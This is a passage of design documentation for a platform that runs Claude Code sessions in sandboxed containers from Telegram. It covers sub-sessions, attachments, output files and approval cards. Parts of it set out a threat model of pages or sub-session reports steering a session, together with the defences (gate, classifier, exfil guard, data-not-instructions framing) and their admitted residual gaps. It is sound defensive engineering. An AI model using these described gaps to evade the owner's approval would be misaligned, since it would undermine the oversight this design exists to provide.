# The platform: Claude Code sessions in lanes

Besides the assistant, Retinue can run Claude Code sessions on your server — an unmodified `claude -p` of a pinned
version, each in a **lane** container of its own — driven from the same Telegram chat. The sessions run in Claude
Code's `auto` mode, as on your Mac: a call your rules do not decide is decided by the CLI's own classifier, and what
it blocks — or what a card rule names — comes to you as a card; what would leave the system (a push, a pull
request, a release, a publish, a connection to another machine, a letter) is never granted at all: it comes as a
courier card, and you run it yourself. The assistant is untouched: plain text in the chat still goes to her, and her archive never sees a
session.

```
Telegram ⇄ router (the only bot poller; holds the token)
             │  replies to a session's messages, /new <track>, the cards' buttons
             ▼  platform-router (internal)
           platform (uid 10007): its own SQLite — sessions, every line of every run, approvals, cards
             └── lane-private (internal) ── the room (uid 10005) ── lane-private-sni ── lane-private-egress → any
                                            the Base, your code, the web;  the SNI guard   public host, 443
                                            Bash → GitHub and the registries only
```

The platform holds no bot token and has no route out. A lane reaches the platform and its own proxy, nothing else.
`lane-code` and `lane-web` are retired into the room ([Retired lanes](#retired-lanes)).

## Turning it on

```bash
sudo TELEGRAM_OWNER_ID=123456789 PLATFORM=1 bash /opt/retinue/deploy/setup.sh
docker compose -p retinue --env-file /srv/retinue/stack.env -f deploy/compose.yml up -d --build
```

From then on it stays on (as long as `/srv/retinue/platform` exists). `setup.sh` adds the compose profile
`platform`, generates `RETINUE_PLATFORM_TOKEN` (the router to the platform), `RETINUE_LANE_TOKEN_PRIVATE` (the platform to the room;
also `RETINUE_LANE_TOKEN_CODE` and `_WEB`, used only by the retired lanes) and `RETINUE_HOOK_SECRET`, puts
`platform_url` in `router.yaml`, writes `/srv/retinue/platform/platform.yaml` from
`deploy/platform/platform.example.yaml` once, and, for the retired lane-code only, copies its list of hosts to
`/srv/retinue/egress/lane-code-hosts.txt` once — both are yours to edit afterwards. For the
room it writes the open proxy's files ([The open proxy](#the-open-proxy)). With `BACKUP=1`, the platform's volume `platform-data` is backed up; the lanes' volumes are not: the
transcripts are in the platform's database, but the room's `/work` is not backed up — a session's commit in
`/work/code/<name>` that you have not pushed, and any file outside `/work/base`, lives only on the server. The lanes run on the stack's
`CLAUDE_CODE_OAUTH_TOKEN`, which only the platform holds: it sends it with each run, and no lane container has it
in its environment.

Run the container probe below before the first session.

## Tracks and sessions

A **track** is a name in `platform.yaml`: its lane, its kind, its directory under the lane's `/work` (it must exist
there), its always rules. The example has one lane, the room ([The room](#the-room)), and on it `notes`, `research`
and `base` (the root of the Base) and `code` (your repositories, [code.md](code.md)).

- `/new <track> [text]` starts a session on that track; the answer names the session. `/new <sphere> [text]` starts
  one in that sphere, on its track ([Spheres](#spheres)). Bare `/new` still starts the assistant's conversation over,
  as before.
- **Reply** to any of a session's messages to write to it. A reply while a card is open makes that card stale («Expired:
  you wrote a new message»): the call it asked about is not run. A reply to an open question's own message is
  its answer instead ([Questions](#questions)). Text and voice go into a session: a voice note,
  an audio file or a video note in reply is transcribed by the router's own speech path (the assistant's scribe and
  limits) and goes in as «(by voice) <transcript>», and the answer shows what was heard («🎙 «…»»); speech that cannot
  be read is said with the reason, and nothing goes in. A photo, a PDF or any other file goes in too
  ([What a session gets from you](#what-a-session-gets-from-you)); a video, a sticker and the like are refused. Any
  forwarded message, your own forward too, is data for the assistant, never a session's input. Transcription holds the Telegram update loop
  as the assistant's own voice path does, and an album of audio files becomes one input per file.
- A session's **summary** is the final text of a turn, sent as a [ping](#pings). A code session closes on it;
  a reply opens it again. A private session goes idle. A session idle for 7 days is closed.
- A turn cut by a graceful stop of the platform or of its lane (`docker compose stop`, `restart`, an update that
  recreates either, in any order) goes on by itself: the platform records the runs it stopped, a lane journals
  its own stop as such (`stopped` with `by: shutdown`), and when such a run's end comes in, the session is resumed
  once with «The platform restarted in the middle of your turn. Continue from where you stopped.», and its
  summary says «Turn cut off: the platform restarted…». If you wrote to the session meanwhile, your message goes
  next instead, alone. A session waiting on a card keeps its card; a run stopped any other way (a crash, a kill)
  goes idle and waits for you.
- At most 12 sessions run in the room and 12 in all, one place always kept for your own message; the rest wait
  their turn.
- **The subscription's limit.** A run that hits it waits for the reset instead of failing: the lanes run the CLI with
  its retry watchdog (`CLAUDE_CODE_RETRY_WATCHDOG=1`), a reset at most 5 hours away is waited out
  (`CLAUDE_CODE_RETRY_WATCHDOG_MAX_USAGE_LIMIT_WAIT_MS`; a weekly limit fails at once), and no request waits more than
  6 hours in all (`CLAUDE_CODE_RETRY_WATCHDOG_MAX_WAIT_MS`). While it waits, the session stays «working» and holds its
  room on the lane; you get «Subscription limit — waiting for the reset at HH:MM» once per wait (from the CLI's `system/api_retry`
  line: a 429 waited longer than the watchdog's 5-minute backoff; a wait that is not a finite number is ignored, and
one past the CLI's 6-hour cap is read as 6 hours), the time in `owner_tz` of `platform.yaml` (default
  `UTC`). The watchdog also retries other transient API errors longer (about 3 hours). The CLI's recheck of a
  limit lifted early (`…_USAGE_LIMIT_RECHECK_MS`) came in 2.1.305 and is not used: the pin is 2.1.304, and the lanes'
  `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` turns those checks off anyway.
- **A side question** from the app starts a session of its own beside the one it is about and never writes into it
  ([face.md](face.md#in-the-app)).
- **`/wait`** answers with «Waiting for you» as text ([face.md](face.md#the-feed)): a head with the count, then one message
  per session's row, grouped by action — its icon, sphere or track, title, how long it waits, its one line and
  `session <id>`, with «Open in the app» when the face is on. Reply to a row to write to its session (to a
  question's row: that is its answer, as a reply to the question's own message; the line is mapped apart from the
  card, so the card's later rewrites never touch it). A card to decide is not answered by a reply — it would only go
  stale — so its line says «Decide with its card's buttons or in the app.» and a reply to it goes nowhere. The
  assistant's rows come as one system message in her conversation (on record there): a reply to it goes to her with
  that message quoted. A session's «To the Base» row (🗂) says «Press «To the Base» under its result or open it in the app.» and maps
to nothing. The first 10 rows; «N more — in the app.».
- If the platform is down, the router says «The platform is unavailable — try again later.» and never hands the message to
  the assistant.

### Archive

«Archive» in a session's menu in the app (`POST /api/sessions/{id}/archive`, `Platform.archive`) takes the session out
of every list at once, with its sub-sessions and side questions and theirs. Each one still open ends where it stands, as
a stopped sub-session does: its queued runs dropped, its running turn interrupted, its cards stale («Expired: you
archived the session»), closed. Nothing is deleted: its link still opens it, and the row carries `archived` until a turn
of it begins again — a message from you brings it back to the list.

### The assistant's digest

The feed also shows what waits in the assistant's world. The router reads it from its own tables and pushes it to
the platform (`POST /owner/waiting`, the router's token, as every `/owner/*` call), replacing the one there whole:
looked at every 30 s, pushed when it changed and at least hourly (`bridge.WAITING_*`), in a task of its own beside
the notes' pump and with a 10 s wait, so a platform that hangs on it holds back no card. A 413 is a refusal like a
400: logged, not pushed again until the digest changes or the hour is up. The platform never calls the router.
What the router counts (`retinue/waiting.py`), each by a rule it already had:

- **letter / chat** — what her judgement said asks you to act (`needs` reply, decide, pay, attend, act; «read» is
  only to know) and is still open (`MailStore.asks`, [mail.md](mail.md#closing-what-waits)): not closed by your
  «Done» or «Not a task», not put off by «Tomorrow», not answered as code sees it, not run out. One row per person
  and ask — «pay» and «decide» of one sender are two rows, so a press closes exactly what its row says.
- **draft** — a reply card whose «Send» still means something (`outbox.LIVE`, not expired); its letter is not
  counted again.
- **deadline** — a `deadline` of any Record or an `until` of a profile Record at most 7 days away (the face's «Deadlines»),
  from the heartbeat's last reading of the base; an overdue `deadline` up to 3 days. Its `since` is three days before
  its day — the heartbeat's own push rule — so one further off has a `since` ahead: the platform keeps it out of «Waiting
  for you» (and `/wait`) until then and shows it only under «Deadlines». It also carries its day (`when`, `YYYY-MM-DD`) and,
  when the path is a plain one, the Record's path in the base (`path`) — never the Record's text.

The digest is minimal: `{items: [{id, kind, who, title, since, sphere?, t?, when?, path?}], bot, chips?,
closed_today?, expired_week?}` — an id made with an HMAC under the
router's own random salt (its kv `waiting.salt`; never sent), so it names no one and cannot be checked against a guess;
`letter`, `chat`, `draft` or `deadline`; a display name (never an address); a one-line title — the action and at most
80 characters of her words with every address, link, phone number and run of four digits or more masked
(`waiting.said`), so no code, amount or account crosses; a time; the base's Space. The router cuts it to 50 items
and under 32 KB, the least pressing left out. The platform checks it again (`feed.clean`): at most 50 items and
32 KB, no other field, a name or title folded (NFKC) with invisible characters dropped, then anything shaped like an
e-mail address written as ‹address›, then cut to 60 and 160 characters; `when` and `path` only on a deadline — a real
date; a Space, at most two folders and a `*.md` name, no dot-led part; one item off the contract refuses the whole
push (400) and the last one stays.

A person's row (`letter`, `chat`) also carries **`t`**, 32 hex characters: an HMAC under the
same salt of its items' numbers, which never leave the router. The router keeps `t → numbers` in its kv
(`waiting.rows`) for 24 hours after it last sent the row; the same items give the same token, so neither a restart
of the router nor a digest the platform refused can make a press name items you did not see. Beside the items go two
counts, `closed_today` (rows with an ask closed since your midnight, by your press or by your answer) and
`expired_week` (rows with an ask that ran out with no mark in the last 7 days) — numbers only, no list. The platform
takes `t` only on a `letter` or a `chat`, and each count as a whole number from 0 to 100 000 (0 when absent).

**A press in the app** — «Done», «Not a task», «Tomorrow», «Undo» — comes back the way every answer to the router does:
the face takes `POST /api/waiting/press {t, action}` (`done`, `dismissed`, `later`, `open`), checks only its shape and
journals a `waiting-press` note; the bridge pulls it with the cards and the router marks the items its own kv names
for that token (`waiting.press`), then pushes the digest again at once. A token it does not know marks nothing and you
get «The press did not apply: the list is out of date.». Applying it is wrapped on its own: a failure is logged, you get
«The press did not apply: a server error. Try again.», and the note is confirmed, so a press never holds back
the cards behind it.

**A row's sheet** ([face.md](face.md#her-rows-sheet)) needs what only the router has — her judgement whole, the
deadline, where the letter or the chat is, a draft's text — and the digest stays minimal, so the router is asked for
it one row at a time, when the owner opens it, and the platform relays the answer without keeping it. The face takes
`POST /api/waiting/detail {ref, t?}` — a row of the digest on record: a person's with its own token, or a draft —
and queues `{r, ref, t?}` in memory, `r` a fresh number. The router keeps its own long
call open beside the notes' pump (`bridge.detail_loop`): `POST /owner/waiting/asked` answers `{asked: [...]}` as soon
as anything is asked, or empty after 25 s. So a sheet never waits behind a card Telegram is slow to take, and nothing
of it enters the notes' journal. The router builds each sheet from its own tables (`waiting.detail`) — a token's
items as `press` reads them, only those still open; a draft by its id — and answers `POST /owner/waiting/detail
{r, detail}` (`detail: null`: it does not know the row any more; `failed: true`: building it failed, logged by `r`
only). The platform checks it (`feed.clean_detail`: its fields, their types and caps; a link of any shape but the router's
own is dropped) and hands it to the request still waiting; an answer nobody waits for is dropped, and one off the
contract — or too big, which the router then says as `failed` — ends the wait at once. Only the newest of the
router's long calls takes what was asked: one still held from before a restart of the router gives it up. A request waits 12 s at
most, 8 at once; whatever ends it, the face going away too, forgets it. The sheet carries her words and a draft's
text masked as the digest's title is (`waiting.masked`), a link to the Gmail thread or the person's @username, and the
owner's own mailbox — never the letter's text, its quote or the sender's address. It is held in the platform's memory
only while the face's request waits: never written, never logged.

The same push carries the **status chips** (`waiting.chips`, from `Pages.chips`): `[{key, text, level}]`,
`key` one of `health`, `backup`, `limit`, `build` at most once each, `level` `ok`, `warn` or `bad`, the text folded and
cut to 60 characters — the build's said without its age («pages built»), so the digest does not change every
minute. No pages on the router: none. A chip off the contract refuses the push as an item does. The face shows them on
«Today» (`GET /api/feed`'s `chips`).

## Spheres

A **sphere** is a sphere of your life — a Space of your knowledge base: travel, home, health… — named in
`platform.yaml` (`spheres: [{name, title, icon, track}]`; the example lists the base's Spaces, all on `notes`). It is
how you find a session again: the app groups the list by sphere ([face.md](face.md#in-the-app)), and each sphere has
at most one **main session**, the long-lived one you talk to by the sphere's name. `track` is where a new session of
the sphere runs; `cwd`, when given, is its directory inside the track's (`base/travel`: a session in a Space of your
Base, [base.md](base.md)), and a session keeps the directory it was made with. A sphere's name is also a bot command: `a-z`, `0-9` and `_`, not a track's name, not one of the
bot's own commands (`new`, `app`, `wait`… — `config.BOT_COMMANDS`); the platform refuses to start otherwise.

- **`/<sphere> <text>`** (`/travel find a place to stay in Zurbagan for June 3–8`) writes into the sphere's main session, as a
  reply to it would; when the sphere has none, it starts a session there and makes it the main one. The app's «＋»
  with a sphere chosen goes the same way (`main: true`, [face.md](face.md#a-new-task)), with attachments too; a
  message the main session did not take (its lane retired, its files refused) is `ok: false`, so the app keeps it. **`/<sphere>`**
  alone answers with the main session's state and the first line of its last summary. A reply to either answer goes
  into that session. The router knows the spheres by asking the platform (`/owner/spheres`, at its start and every
  10 minutes, kept in its SQLite for a restart while the platform is away) and adds them to the bot's menu
  («/travel — ✈️ Travel»); the logic is the platform's (`/owner/sphere`, `retinue/spheres.py`).
- **A session's sphere** is set when it starts — `/new <sphere>`, `/<sphere>`, the app's form, or its parent's for a
  side question, a fork and a sub-session — and you change it in the app's session menu. A session started with
  none names its own by a last line `Sphere: <name>` ([Sub-sessions](#the-sphere-line)). A session moved to another sphere is no
  sphere's main session there. **The main mark** is set and taken off in the same menu; marking one takes it off the
  sphere's previous main session. SQLite holds «at most one per sphere» itself (a unique index on the sphere where
  `main = 1`), so two `/travel` racing make one main session, and the other message goes into it or stays an ordinary
  session of the sphere. Archiving a session takes its main mark off: the next `/<sphere>` or «＋» starts a new one. A main session stays in the app's list however long ago it closed; a message opens it again
  (a `--resume`, which after an hour of silence re-reads the context uncached, as a card says).
- **Unread.** A session is unread when a summary or a new card came after you last looked at it: opened it in the app
  on a visible screen, wrote into it (in the app or in Telegram) or decided its card there. One `seen_at` per session:
  you are one person. The app marks it with a dot.

**A fork** («Fork» in the app's session menu, with its first message) is a new session — `fork_of` the parent —
on the parent's track, lane, directory and sphere, with the track's full rights (unlike a side question, which only
reads). Its first run resumes the parent's CLI session with `--fork-session` (`cliengine.FORK_SESSION`, allowed only
right after `--resume <id>` and only on this path); from its own first line on, it resumes its own. Probed with the
pinned CLI (`tests/test_probes.py`, with our whole argv: `-p`, stream-json, auto): the fork gets a new session id and
`permissionMode: auto`, its first request carries the parent's conversation, its stream holds only its own turn, and
the parent's transcript file is not touched — the parent's next turn never sees the fork's words. A fork is refused
while the parent works, waits on a card, has a run queued, or its conversation ends in a deferred call whatever its
state (a card expired or decided, a resume refused or lost), when you ask and again when its run starts (it may wait
for room on the lane): the parent's transcript then ends mid-turn, and — probed — a fork's resume of a parent with a
deferred call runs that call itself, under the parent's call id, and the parent's own resume runs it again. Every
approval the gate looks up by a call's id is also scoped to the run's session, so one session's grant never runs in
another. A fork is refused, too, when the parent's track has moved to another lane or folder (`sessions.cwd`). Refused at the start,
the fork says so as its summary and goes idle; your next message to it tries again. A side question cannot be
forked, and a session that never ran has nothing to fork.

## Sub-sessions

A session you started hands separable work to sessions of its own — as your main session of a sphere does in Claude
Code on the Mac («Travel» runs «stay», «a trip to the sea») — and is told when each one's turn ends
(`retinue/subs.py`). The lanes' instructions teach it when to (`deploy/lanes/instructions/common.md`).

**The mechanism: an MCP server the platform serves to the run**, at `http://platform:9500/hook/mcp` — beside the hooks,
under the run's own hook token, which the CLI puts in the header from `RETINUE_HOOK_RUN` (no command sees it). Three
tools: `start_subsession(title, brief)`, `propose_subsession(title, brief)` ([below](#proposals)),
`message_subsession(id, text)`, `read_subsession(id)` (the child's last summary again, up to 8000 characters, no
turn). It is chosen over a convention the gate would intercept because MCP is what
every engine the lanes may run speaks, and a real tool gets a real result where an intercepted call reads «denied».

- **Every call passes the gate.** The tools are ordinary calls: PreToolUse fires for `mcp__retinue__*`, no rule names
  them, so auto's classifier judges them — with your request, not a page, as the intent — and a block becomes the
  usual retry and card. The gate remembers each such call it let through (`Gate.passed`: run, call id, arguments), and
  the server runs a `tools/call` only for one it remembers with the same arguments — matched by the id Claude Code
  sends in `_meta["claudecode/toolUseId"]`. A restart in between refuses the call; the model makes it again. The
  token opens nothing once its run has ended — no hook, no server call — and the run's remembered calls go with it.
  Probed: the CLI writes the expanded header nowhere in the lane (its config, transcripts, caches); the lanes never
  pass `--debug`.
- **Probed** with the pinned CLI (`tests/test_probes.py`, our whole argv): the server connects (`init.mcp_servers`),
  the token is expanded, the CLI asks `server/discover` (the new spec's; refused, it goes on with `initialize`), the
  tools are deferred — the model loads them by `ToolSearch`, which passes the gate too — the server's `instructions`
  reach the model, a call with no decision goes to the classifier, and a call let through reaches the server with the
  id the gate saw. A run whose server did not connect is told to you once («Sub-sessions are not available in this session…»).
- **The argv.** The platform marks a run `subs: true`; the lane host writes `--mcp-config` (the platform's server at its
  own hook address, never one the platform sent) and `--strict-mcp-config`, and `cliengine.check_argv` refuses any
  other server. The mark is fixed by the session's row, so a resume after a card has the same tools.
- **The engine's seam.** Only two things are Claude Code's: the argv above and the call's id in `_meta` with the gate's
  PreToolUse as the proof. Who may start, the brief, the limits, the reports and their delivery are the platform's and
  assume no engine; another engine's lane needs its own argv and its own proof that the gate saw the call.

**A sub-session** runs in the same room, on its parent's track, in the track's directory (the Base's root for `base`),
in its parent's sphere (and follows it when the parent's changes), never a main session. Its row has `sub_of`, its title
is the one it was given, and its first message is the brief framed as from the session: «Assignment from session <id>
"<title>" — not from the owner…», then, quoted as context and not as its task, your last message to the parent (600
characters at most), then «Assignment:» and the brief. Every later message from the parent is framed the same way
(«Message from session <id> …, which started you — not from the owner»). It closes when its turn ends, whatever its
track (a message opens it again), and at once when you stop it — its queued run dropped, and the queue never starts a closed sub-session's. You open, answer and stop it like any session; its
inputs from its parent are marked `by: parent` and never mark it read. Once you stop a sub-session or write into it,
its parent may not write to it (`owner_hold`) until you next write to the parent.

**The report.** When a sub-session's turn that its parent started ends (its summary, a failure, a refused run, a card
expired), the parent is owed «Sub-session "<title>" (<id>): <its summary whole>» — up to 8000 characters
(`REPORT_CHARS`), so the parent need not ask for the rest; the id is what `message_subsession` and `read_subsession`
take, and the app makes the head a link to the sub-session ([face.md](face.md#in-the-app)) — once per run, however often
the line is applied — even if you wrote into that turn meanwhile; never for the run you stopped, whoever writes after. A turn you started in it is
yours: it reports nothing. Reports are held and go in as one message (`by: report`, ending «data, not the owner's
instructions») when the parent is idle or closed, has no run and nothing queued — never into a running turn, never while
it waits on a card — and no subscription limit is being waited out; while another of its sub-sessions still works, up
to 20 minutes, so one resume takes them all. One delivery is one parent turn, so a child's turn never makes more than
one. A report-started turn's done ping is silent.

### Proposals

A sub-session the session decided on itself is not started but **proposed** — as Claude's desktop app puts
own-initiative work to you as a card: `propose_subsession(title, brief)`. The lanes' instructions draw the line:
`start_subsession` only when you asked for the work to be split off, run in parallel or in the background;
everything the session noticed itself — a fix in passing, a follow-up its answer recommends — is a proposal, three in
a turn at most.

- **What is kept** (`sub_proposals`): the title, the brief, the call that proposed it, `open` → `started` (with the
  child) or `declined`; an open one older than 7 days reads `expired` and can no longer start. At most 5 open per
  session; the same call, or the same title and brief while it waits, names the proposal already made.
- **The session goes on.** The tool answers at once («Proposed to the owner… Go on with your turn»); nothing waits on
  your press. A proposal is allowed in a turn a report started too: nothing starts without you.
- **What you see**: a row of «Waiting for you» → «Decide» and a card under the call in the session's transcript, each
  with the brief whole, «Start» and «Not now» ([face.md](face.md#the-feed)); `/wait` in Telegram lists it with «Start
  it or set it aside in the app.». No ping of its own: the session's turn ends with its own.
- **«Start»** runs the very start a tool call would (`Subs._spawn`) under the key `proposal:<id>` — the limits, the
  framed brief, the quiet ping — so a second press, here or on another device, names the child already started.
  Refused (a subscription limit, 10 open, the session archived), it says why and stays open. **«Not now»** sets it
  aside; the session is not told, as the desktop app does not tell it.
- **Against a page that steers the session**: the brief is the model's text, so it is shown to you whole, as plain
  text, before «Start» can be pressed (a long one opens first); the child gets it framed as from the session, not from
  you, and every call of the child passes the gate as any sub-session's.

**Limits** (`subs.py`) — loose on purpose, near Claude Code's own on your Mac:

| | |
|---|---|
| depth | 1. Only a session you started has the tools: not a sub-session, not a side question; a subagent's call is denied by the gate. A start asked for in a turn a report started comes to you as a card («A new sub-session is asked for by a turn a sub-session's report started…»): a page a child read must not grow the family; granted, it runs; the tool's own refusal points the session to a proposal instead. Such a turn stays a report's for the gate whatever you write into it while it runs — your next run is your own turn — but its ping answers you: it rings and closes your open buttons as your own turn's would |
| open per parent | 10 (working, waiting on a card or queued; a message reopening a closed one counts). No day cap. None started while a subscription limit is being waited out: the child would only hold a place |
| at once | as many as the room holds (12 places, 12 in all), but one is always yours: a sub-session's run, a parent's message to it and a report's turn start only while one more place stays free on the lane and in all (`platformd.drain`), so your own message always starts. The rest wait in the queue — `queued: true`, «waiting for room on the lane» in the app, «it waits in the queue» in the tool's answer |
| exchanges | after 30 automatic ones in a row without your word (a report delivered or a message to a child is one), reports stop waking the parent and wait for your next message; the parent gets one quiet line «The sub-sessions and the session exchanged 30 times in a row without you — their reports wait for your message», no sound. Messages to children stay allowed. Your next message into the parent or any of its children counts from zero |
| the same start twice | the same call id, or the same title and brief while that child is open: the child already started is named |

The parent does not write into a child you stopped or wrote into (above), nor into one waiting on your card.
Your place in the room is kept by the reserved slot rather than by putting your messages ahead of the queue: that
would reorder one session's own messages.
**«Stop» on a parent** stops its family: queued runs dropped, running ones stopped, cards stale, each closed, held
reports dropped. **What you see**: a quiet ping when a sub-session starts («Started by session …: <title>», the brief
whole in its transcript); its done turns are quiet (the parent reads them), its cards and failures ring as usual; the
parent's next ping that needs you rings. The session JSON has `sub_of`, `children` (open), `queued`, and `side` for a
side question ([face.md](face.md#api)).

**What stands against a page that steers a session.** The classifier sees the start with its brief against your
request; depth 1; 10 open per parent; your ping with the brief; the brief and the parent's messages framed as not
yours; and every call of the child passes the gate, the never list and the exfil guard. A child's report is a user
message of the parent's next turn — the classifier reads it as intent there — so a start in a report-started turn is
your card, and after 30 exchanges without you reports wait for you. Not closed: within that
turn the report can still steer the parent's other calls, as a page can steer the session that read it.

**Native pieces of the CLI considered.** 2.1.304 has agent teams (`CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS`): `Agent`
with a `name`, `SendMessage`, `ListAgents`. Probed with our argv: a named agent runs in the foreground inside the
parent's run, and a later `--resume`'s `SendMessage` to it answers «Resumed agent» — inside that run again. It is a
subagent you can address, not a session: it lives in the parent's `-p` process, the parent's turn waits for it, you
cannot open or answer it, and it cannot wait on a card. The docs agree: teammates are not spawned under `-p`, the team
dies with its session, `claude --bg` is interactive only.

### The sphere line

A session started with no sphere and not placed by you names its own: the server's instructions list the sphere names,
and the model ends its turn with one line `Sphere: <name>` — the very last line, outside a code fence; bold or code marks
tolerated; only a configured name. The platform takes it off the ping (the app hides it), sets the sphere, never the main mark, and the session's sub-sessions follow — but one you
placed yourself. Once you place a
session in the menu (`sphere_by: owner`), its line is ignored; a sub-session and a side question never read theirs.

## What a session gets from you

A photo, a PDF or any other file sent **in reply** to a session's message (its caption is your text), or attached in
the app, goes into that session; an album is one message (its parts gathered for 1.5 s, as the assistant gathers
hers, under the first part's id; the captions joined). The parts are kept in the router's SQLite as they come: a
router restarted mid-album gathers them again on start, a part Telegram delivers again joins its album by its group
(a part already kept is not taken twice), and an album that cannot be sent is said («an album of N files was not put together…
Send it again.»). **A reply carrying files is never an answer to a question card** (the questions part): it goes
in as an ordinary message with its files, and the question's own buttons, or a reply in text, answer it.
The router reads nothing of it: it downloads the bytes (the
Bot API gives bots 20 MB a file) and hands them to the platform whole, with their SHA-256 (`bridge.files`); the app
sends the same (`POST /api/sessions/{id}/input` with `attachments`). The platform makes them the session's
(`retinue/inbox.py`):

- **A picture** (by its name, `.heic` and `.heif` too, else by a raster media type) becomes an `image` block: read by
  the router's own reader (`attachments.isolated`: a worker process with a deadline and a memory ceiling, one at a
  time across all messages, 1 GiB of address space in the platform's 768 MB),
  turned upright, at most 1568 px on its long side, re-encoded as JPEG — HEIC from an iPhone too. One that does not
  decode is said («Not passed to the session: picture "x.png": the picture could not be opened») and left out; the rest of
  the message goes in. A block the API rejected would sit in the session's history and break every later turn.
- **A PDF** of at most 20 pages and 5 MB becomes a `document` block, opened by the same reader first. A longer one,
  or one that does not open, goes in as a file: the session reads its pages itself.
- **Anything else** — a table, an archive, code, a text, a picture of a kind the reader does not re-encode (SVG,
  PSD) — goes into the session's own folder as a file,
  `inbox/<date>-<name>` (the date your own, `owner_tz`): the platform cannot write there (its mount of the lanes'
  `/work` is read-only), so the lane host writes it, then adds to your message where the files now are («The
  owner's files are saved in the session's folder: - inbox/2026-10-27-report.xlsx (12 KB)»). The name is reduced to a plain file
  name (no path, no leading dot, at most 80 characters); the same bytes sent again are the same file, other bytes
  under a taken name get «-2». Nothing is followed: a session that made `inbox` or a file in it a link gets a refusal,
  not a write elsewhere; a name that is taken by a FIFO, a device or a file of another size is never opened for
  reading or waited on — the file gets the next name. The lane host does this file work in a thread. When the
  session's folder is in a git repository (the nearest folder up to `/work` with a real `.git` folder), the lane host
  adds `/<path>/inbox/` to that repository's `.git/info/exclude` once, so `git status` stays clean; it touches that
  file only — never hooks or config — and follows no link on the way (a `.git` file of a worktree is left alone).

**The reader is a stranger's file's process, and is kept as one.** Its environment is `PATH` and `LANG` and its own
limits, nothing of its parent's (`attachments.worker_env`: no token, no key); it sets its own `oom_score_adj` to 1000,
so the container's OOM killer takes it before the platform or the router; it keeps its address-space limit. The
platform and the router make themselves non-dumpable at start (`prctl(PR_SET_DUMPABLE, 0)`, `attachments.undumpable`),
so a worker a file took over cannot read their `/proc/<pid>/environ` or memory, though it runs as the same user. All
of one message's pictures and PDFs are read within 240 s (`inbox.PARSE_BUDGET_S`, below the router's and nginx's 300
s wait); a file not reached by then is named in the answer («its turn did not come… send it separately») and left out. A
name loses its control characters and bidi overrides (U+202A–U+202E, U+2066–U+2069) before anyone reads it.

Your text comes first, then one line naming what came with it («Attached: photo 1280×960; PDF "invoice.pdf", 3 pages;
file "data.csv" (in the inbox/ folder, path below).»), then the blocks. Limits, checked by the platform whatever sent it: at
most 10 files and 30 MB in one message, 20 MB a file (`inbox.MAX_*`); the router does not download what Telegram
already says is over them, and says so. A message whose files all failed and that has no text does not go in at all.
The lane checks the blocks again before it writes them (`cliengine.check_content`: `text`, `image` as JPEG,
`document` as PDF, base64, 24 MB of it at most) and the files (`check_files`).

The platform takes the owner's message up to 44 MB (`inbox.BODY_MAX`); a hook's body stays capped at 16 MB.

Probed with the pinned CLI (`tests/test_inbox_probe.py`, against the stand-in API): the blocks reach the model byte
for byte on the first turn and again in the history of a resume, and the CLI does not echo your line into the
journal. Checked once with a real login (Haiku): a picture with «4711» and a red circle, sent as an
`image` block and again as a one-page scanned PDF in a `document` block, was read back both times as «4711,
red» (in Russian, as it was asked then).

The app shows your messages in the transcript where they came — your text, a picture as the platform's own
thumbnail of its JPEG (`GET /api/sessions/{id}/inputs/{input_id}/{n}`, 320 px), a PDF or a file by its name and size
([face.md](face.md#api)).

## Files from a session

What a session makes for you as a file — a report, a PDF, a chart, an HTML page — it saves under `out/` of its
directory: the lanes' instructions say so (`deploy/lanes/instructions/out.md`, included in every lane's managed
`CLAUDE.md`). When its turn ends (its summary, a failure too; not a card, which only pauses the turn), the platform
looks there through its read-only mount of the lane's `/work` (`retinue/outfiles.py`) and hands over every file
changed since the session's last look (its creation, for the first) whose bytes it has not handed over from that
directory before:

- **In Telegram**, each file after the summary, as a reply to the session's last message: a PNG, JPEG or WebP up to
  5 MB as a photo (refused as one, as a document), a PDF, a document, a table or an archive as a document, with no
  caption. Reply to it to write to the session, as to any of its messages. What was left out comes as one message
  «Files · <track> · session <id>» with the reason per file.
- **An HTML page or an SVG never goes to Telegram as itself**: opened there, its script would run with the open web —
  `out/` would be a way out of a lane that has no web. It comes as a message with its name and «Open», a button of
  the face's Mini App (`/f/<id>`), where it opens in the sandboxed frame ([face.md](face.md#a-sessions-files)).
  Without the face it comes as a document `<name>.txt`, plain text. The residual: a page in the sandbox runs no
  script and loads nothing CSP governs, but Chromium does not hold `<link rel=dns-prefetch>` to CSP, so a page opened
  in the face can make your phone resolve a name it chose — a DNS lookup, which can carry a few bytes in the name,
  no request.
- **In the app**, under «Files» of the session ([face.md](face.md#a-sessions-files)).
- **Limits**: the types `.pdf .md .txt .csv .json .html .htm .png .jpg .jpeg .gif .webp .svg .docx .xlsx .pptx .zip`
  (served as the type the extension has on the list, never what the file says); 20 MB a file (Telegram lets a bot
  send 50, and the bytes cross from the platform to the router as JSON); 10 files and 50 MB a turn; 500 entries and
  three folders deep a look, files and folders counted alike; empty files, dotfiles and dot-folders left out. Every
  limit is checked before a byte is read. A file written in the last 2 s may be half written: it waits for the next
  look.
- **Storage caps** (`platform.yaml`): `out_store_mb` (default 500) — the bytes kept in all — and `out_day_mb`
  (default 200) — new bytes in a day. A file over either is left out, with the reason. Bytes already kept cost
  nothing again.
- **Names** are stored and shown as valid UTF-8 with every direction mark, override and control character written as
  a label (`report⟦U+202E⟧fdp.exe`), in Telegram, in the app and in a downloaded file's name; a name that is not UTF-8
  is left out («the file name is not UTF-8»).
- **Links** are followed as the gate follows them: an absolute target is a lane path, a link out of `/work` is refused
  («the link leads outside /work»), a link to a folder (or to `/work` itself) is not walked; the walk goes by
  directory descriptors (`os.fwalk`). Then the file is opened one directory at a time with `O_NOFOLLOW`, so a link
  swapped in after the check fails instead of leading into the platform's own files. A bad link or an unreadable
  entry is said only in the look after it appeared, not after every turn. The platform reads bytes and hashes them;
  it never runs, opens or interprets a file.
- **Kept by value**: the bytes go into the platform's SQLite (`out_blobs`, one copy per SHA-256) in the same
  transaction as the file's row, the router's note and the app's event, so a crash looks again and a file is never
  sent twice; a turn that ends while a look runs is looked at again. A look that breaks is said once («Files from out/
  were not collected: platform error (…)») and owed no more, and nothing in a look can hold back the lanes' journals or
  the queue. Files and their bytes are pruned after 30 days.
- **What a session hands over**: a file whose time (`mtime` or `ctime`, 2 s of slack) is at or after the look's start
  and whose bytes differ. A side question's session hands nothing over. Two sessions may share one directory (one
  track, or two tracks with one lane and `cwd`): when another of them ran during the look's window, a file goes to
